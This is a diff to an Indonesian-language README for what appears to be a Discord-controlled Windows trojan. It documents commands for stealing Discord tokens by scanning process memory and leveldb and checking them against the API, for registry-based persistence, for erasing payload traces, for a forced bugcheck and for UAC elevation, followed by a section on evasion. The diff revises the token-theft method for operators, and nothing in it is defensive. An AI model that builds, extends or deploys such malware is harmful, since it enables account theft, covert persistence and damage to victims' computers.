@@ -77,7 +77,7 @@ padanan yang benar-benar jalan dan alasannya ditulis, bukan disembunyikan.
 | **channel purge** | `purge` | di repo acuan menghapus pesan channel; di sini menghapus jejak payload lalu keluar |
 | **BSOD** | `bsod yes` | bugcheck sungguhan, dijaga argumen `yes` |
 | **rickroll** | `rick [url]` | form borderless topmost; backend IE, jadi `.mp4` langsung yang jalan |
-| token Discord | `grab` | DPAPI + AES-256-GCM, tanpa admin |
+| token Discord | `grab` | scan memori proses + leveldb, diverifikasi ke API, tanpa admin |
 | screenshot semua monitor | `shot` | Pillow `ImageGrab(all_screens=True)` |
 | persistensi | `persist` / `unpersist` | registry Run + salinan di `%LOCALAPPDATA%` |
 | update jarak jauh | `update`, `update gh` | unduh, verifikasi sha256, timpa, relaunch |
@@ -89,9 +89,10 @@ padanan yang benar-benar jalan dan alasannya ditulis, bukan disembunyikan.
 - `admin` — `ShellExecuteW runas`, memunculkan UAC, instance baru elevated.
 - `bsod yes` — `NtRaiseHardError` dengan ResponseOption 6.
 
-`grab` justru **tidak** butuh admin: kunci `Local State` dibuka lewat DPAPI
-profil user yang sedang login, jadi cukup hak user biasa. Kalau payload jalan
-sebagai akun lain (mis. SYSTEM), kunci itu tidak terbuka.
+`grab` justru **tidak** butuh admin: memori `Discord.exe` dan `Local State` ada
+di sesi user yang sama, jadi cukup hak user biasa. Kalau payload jalan sebagai
+akun lain (mis. SYSTEM), jendela memori itu tidak terbuka dan yang tersisa cuma
+jalur leveldb — itupun hanya kalau kuncinya masih cocok.
 
 ## Evasi
 
